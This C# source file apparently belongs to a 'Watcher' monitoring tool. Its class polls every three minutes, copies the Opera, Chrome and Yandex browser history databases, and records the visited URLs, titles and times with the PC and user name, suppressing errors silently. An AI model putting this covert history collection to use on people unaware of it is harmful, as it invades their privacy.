using System;
using System.Data.Common;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Management;
using System.Threading;
using System.Threading.Tasks;
using Watcher.Models;

namespace Watcher.Managers
{
    public class WebManager : IManager
    {
        delegate void WebWatcher();
        WebWatcher watcher;
        SQLManager sqlManager;
        Task watch;
        CancellationTokenSource cancelTokenSource;
        CancellationToken token;

        string dbOpera = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\Opera Software\\Opera Stable\\History";
        string dbChrome = $"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\\Google\\Chrome\\User Data\\Default\\History";
        string dbYB = $"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\\Yandex\\YandexBrowser\\User Data\\Default\\History";
        
        public WebManager(SQLManager sqlManager)
        {
            this.sqlManager = sqlManager;
            watcher += GetOperaHistory;
            watcher += GetChromeHistory;
            watcher += GetYBHistory;
            cancelTokenSource = new CancellationTokenSource();
            token = cancelTokenSource.Token;
            watch = new Task(() => {
                while (true)
                {
                    if (token.IsCancellationRequested)
                    {
                        return;
                    }

                    try
                    {
                        watcher();
                    }
                    catch { }
                    Thread.Sleep(180000);
                }
            });
        }

        public void StopWatch()
        {
            cancelTokenSource.Cancel();
        }

        public void Watch()
        {
            watch.Start();
        }

        private void GetOperaHistory()
        {
            var connection = GetConnection(dbOpera);

            if(connection == null)
            {
                return;
            }

            var condition = sqlManager.ReadAllWebLogs().Any() ? $" where date>datetime('{sqlManager.ReadAllWebLogs().Max(x => x.CreateDateTime).ToString("yyyy-MM-dd HH:mm:ss")}')" : null;
            var command = new SQLiteCommand($@"SELECT u.url, u.title, datetime(v.visit_time/1000000-11644473600,'unixepoch') as date FROM visits v
                                                join urls u on u.id = v.url
                                               {condition}
                                                order by date asc;", connection);
            var reader = command.ExecuteReader();
            foreach (DbDataRecord record in reader)
            {
                var test = record["date"].ToString();
                var model = new WebLogModel
                {
                    Url = record["url"].ToString(),
                    Title = record["title"].ToString(),
                    CreateDateTime = DateTime.ParseExact(record["date"].ToString(), "yyyy-MM-dd HH:mm:ss", null),
                    Browser = "Opera",
                    PCName = WorkManager.PCName,
                    UserName = WorkManager.UserName
                };

                sqlManager.WriteWebLog(model);
            }

            connection.Close();
        }

        private void GetYBHistory()
        {
            var connection = GetConnection(dbYB);

            if (connection == null)
            {
                return;
            }

            var condition = sqlManager.ReadAllWebLogs().Any() ? $" where date>datetime('{sqlManager.ReadAllWebLogs().Max(x => x.CreateDateTime).ToString("yyyy-MM-dd HH:mm:ss")}')" : null;
            var command = new SQLiteCommand($@"SELECT u.url, u.title, datetime(v.visit_time/1000000-11644473600,'unixepoch') as date FROM visits v
                                                join urls u on u.id = v.url
                                               {condition}
                                                order by date asc;", connection);

            var reader = command.ExecuteReader();
            foreach (DbDataRecord record in reader)
            {
                var model = new WebLogModel
                {
                    Url = record["url"].ToString(),
                    Title = record["title"].ToString(),
                    CreateDateTime = DateTime.ParseExact(record["date"].ToString(), "yyyy-MM-dd HH:mm:ss", null),
                    Browser = "Yandex",
                    PCName = WorkManager.PCName,
                    UserName = WorkManager.UserName
                };

                sqlManager.WriteWebLog(model);
            }

            connection.Close();
        }

        private void GetChromeHistory()
        {
            var connection = GetConnection(dbChrome);

            if (connection == null)
            {
                return;
            }

            var condition = sqlManager.ReadAllWebLogs().Any() ? $" where date>datetime('{sqlManager.ReadAllWebLogs().Max(x => x.CreateDateTime).ToString("yyyy-MM-dd HH:mm:ss")}')" : null;
            var command = new SQLiteCommand($@"SELECT u.url, u.title, datetime(v.visit_time/1000000-11644473600,'unixepoch') as date FROM visits v
                                                join urls u on u.id = v.url
                                               {condition}
                                                order by date asc;", connection);

            var reader = command.ExecuteReader();
            foreach (DbDataRecord record in reader)
            {
                var model = new WebLogModel
                {
                    Url = record["url"].ToString(),
                    Title = record["title"].ToString(),
                    CreateDateTime = DateTime.ParseExact(record["date"].ToString(), "yyyy-MM-dd HH:mm:ss", null),
                    Browser = "Chrome",
                    PCName = WorkManager.PCName,
                    UserName = WorkManager.UserName
                };

                sqlManager.WriteWebLog(model);
            }

            connection.Close();
        }

        private SQLiteConnection GetConnection(string databaseName)
        {
            if (!File.Exists(databaseName))
            {
                return null;
            }

            try
            {
                File.Copy(databaseName, $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\Watcher\\History", true);
                var connection = new SQLiteConnection(string.Format("Data Source={0};", $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\Watcher\\History"));
                connection.Open();
                return connection;
            }
            catch { return null; }
        }
    }
}
